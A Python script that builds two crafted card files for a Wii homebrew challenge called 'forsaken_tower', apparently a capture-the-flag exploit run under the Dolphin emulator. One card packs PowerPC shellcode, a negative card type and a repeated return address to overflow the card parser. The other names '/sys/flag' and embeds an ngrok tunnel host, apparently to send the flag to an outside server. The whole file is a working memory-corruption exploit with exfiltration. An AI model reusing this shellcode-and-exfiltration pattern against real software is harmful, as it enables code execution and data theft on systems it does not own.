import enum
import os

class CardType(enum.Enum):
    MONSTER = 0
    SPELL = 1
    TRAP = 2


def p32(value: int) -> bytes:
    """Convert an integer to a 4-byte big-endian representation."""
    return value.to_bytes(4, byteorder='big')

class Card:
    def __init__(self, id, texture, card_type, name, description, attack=0, defense=0):
        self.id = id
        self.texture = texture
        self.type = card_type
        self.name = name
        self.description = description
        self.attack = attack
        self.defense = defense

        if len(self.name) > 32:
            raise ValueError(f"Name '{self.name}' exceeds 32 characters.")

    def serializeToBinary(self, output_path):
        # Magic
        magic = b"FTCARD"
        # Id
        id = self.id.to_bytes(2, byteorder='big')
        # Size of the jpeg image content
        size = len(self.texture).to_bytes(4, byteorder='big')
        # Card type number
        card_type = self.type.value if isinstance(self.type, CardType) else self.type
        card_type = card_type.to_bytes(1, byteorder='big', signed=True)
        # Zero padding
        zero_padding = b"\x00\x00\x00"
        # Attack value
        attack = self.attack.to_bytes(2, byteorder='big', signed=False)
        # Defense value
        defense = self.defense.to_bytes(2, byteorder='big', signed=False)
        # Name
        name = self.name.encode('utf-8') + b"\x00"
        # Description
        description = (self.description + b"\x00") if isinstance(self.description, bytes) else (self.description.encode('utf-8') + b"\x00")
        
        # Offset of jpeg image in the file
        offset = (0x18 + len(name) + len(description)).to_bytes(4, byteorder='big')

        file_contents = magic + id + size + offset + card_type + zero_padding + attack + defense + name + description + self.texture
        
        with open(output_path, "wb") as f:
            f.write(file_contents)
            print(f"Saved: {output_path}")


graphics_source1 = "/home/frank01001/Pictures/Misc/bus.jpg"
graphics_source2 = "/home/frank01001/Pictures/Misc/giarre.jpg"

out_path = "/home/frank01001/.var/app/org.DolphinEmu.dolphin-emu/data/dolphin-emu/Load/WiiSDSync/apps/forsaken_tower/content/"

shellcode = b'\x3c\x60\x90\x79\x60\x63\x97\x18\x7c\x84\x22\x78\x38\x84\x01\x01\x70\x84\xf0\xff\x3d\x80\x80\x10\x61\x8c\x7d\xe4\x7d\x89\x03\xa6\x4e\x80\x04\x21\x7c\x7f\x1b\x78\x7f\xe3\xfb\x78\x3c\x80\x90\x79\x60\x84\x97\x60\x7c\xa5\x2a\x78\x38\xa5\x01\x01\x70\xa5\xff\xf0\x3d\x80\x80\x10\x61\x8c\x7e\xd4\x7d\x89\x03\xa6\x4e\x80\x04\x21\x3c\x60\x90\x79\x60\x63\x97\x22\x7c\x84\x22\x78\x7c\x84\x22\x78\x38\x84\x28\x83\x3c\xa0\x90\x79\x60\xa5\x97\x60\x7c\xc6\x32\x78\x38\xc6\x01\x01\x70\xc6\xff\xf0\x7d\x8c\x62\x78\x3d\x8c\x81\x10\x61\x8c\xc9\x74\x7d\x6b\x5a\x78\x3d\x6b\x01\x10\x7d\x6c\x62\x78\x7d\x89\x03\xa6\x4e\x80\x04\x21'

# Create the output directory if it doesn't exist
os.makedirs(out_path, exist_ok=True)

dns = "6.tcp.eu.ngrok.io"

urlcard = Card(
    id=778,
    texture=open(graphics_source1, "rb").read(),
    card_type=CardType.MONSTER,
    name="/sys/flag",
    description= dns.encode() + b'\x00' + b"A" * (0x200 - len(dns) -1),
    attack=0,
    defense=0
)

exploit = Card(
    id=777,
    texture=open(graphics_source2, "rb").read(),
    card_type=-4,
    name="Exploit",
    description=b"AAA\xFF" + shellcode + p32(0x811503a4) * (104 // 4),
    attack=0, 
    defense=0
)

# Serialize the card to binary
output_path = os.path.join(out_path, f"{778}.bin")

urlcard.serializeToBinary(output_path)


# Serialize the card to binary
output_path = os.path.join(out_path, f"{777}.bin")

exploit.serializeToBinary(output_path)
